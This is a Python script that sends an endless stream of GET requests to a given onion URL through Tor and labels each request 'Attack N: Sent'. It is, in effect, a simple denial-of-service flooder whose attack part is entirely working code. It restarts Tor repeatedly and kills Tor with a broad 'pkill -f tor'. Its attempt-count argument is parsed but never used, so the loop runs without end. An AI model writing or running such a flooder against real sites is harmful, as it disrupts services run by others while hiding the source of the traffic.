import subprocess
import time
import requests
import sys



onion_url = sys.argv[1] if len(sys.argv) > 1 else "No URL provided"
number = sys.argv[2] if len(sys.argv) > 2 else "No number provided"



def get_tor_session():
    """Set up a requests session with Tor."""
    session = requests.Session()
    session.proxies = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050',
    }
    return session



def send_session_get():

    try:
        # Create a new Tor session
        session = get_tor_session()
        response = session.get(onion_url, timeout=20)
        print(f"Response status: {response.status_code}")
         # Optionally log the response content
        #print(f"Response content: {response.text[:100]}")

            # Log response to a file
        with open("tor_requests.log", "a") as log_file:
            log_file.write(f": Response: {response.status_code}\n")
    except Exception as e:
        print(f"Error: {e}")
        with open("tor_requests.log", "a") as log_file:
            log_file.write(f"Error: {e}\n")



# Function to start Tor
def start_tor():
    

    #print("Starting Tor...")
    try:
        subprocess.Popen(["tor"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(5)  # Wait for Tor to initialize
        
    except Exception as e:
        print("Error starting Tor:", e)

# Function to stop Tor
def stop_tor():


    #print("Stopping Tor...")
    try:
        subprocess.run(["pkill", "-f", "tor"], check=True)
        time.sleep(2)  # Wait for the process to terminate
        
    except subprocess.CalledProcessError:
        print("Tor is not running.")
    except Exception as e:
        print("Error stopping Tor:", e)

def work():

    attempt = 1
    
    while True:  # Loop for the specified number of attempts

        start_tor()

        print(f"Attack {attempt}: Sent") 
        send_session_get()

        if attempt % 5 == 0:
            
            stop_tor()
            #print("it has been 5 attacks .")

        
        

        attempt += 1


# Test the functions
if __name__ == "__main__":
    
   
    try:
        work()
    except KeyboardInterrupt:
        print("\nExiting gracefully...")